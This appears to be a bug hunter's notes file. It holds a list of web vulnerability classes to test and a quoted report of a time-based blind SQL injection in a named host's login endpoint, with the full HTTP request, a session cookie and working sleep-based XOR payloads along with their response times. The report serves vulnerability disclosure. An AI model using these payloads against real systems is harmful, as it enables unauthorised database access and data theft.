# road

* SSTI (Username and tools)
* sqli 
* File Upload Vulnerabilities
* SSRF Scan
* web cache poisoning
* Os Command Injection
* Path Traversal Injection
* LFI
* 0Auth Injection


# Sqli Reports 
```
I have discovered a SQL injection in https://demor.adr.acronis.com/ using the POST request via the username parameter.
Using the Repearter in Burpsuite I have submitted the following POST request:
POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).
Using various values for the sleep function you get various time responses.
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337
I have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.
```
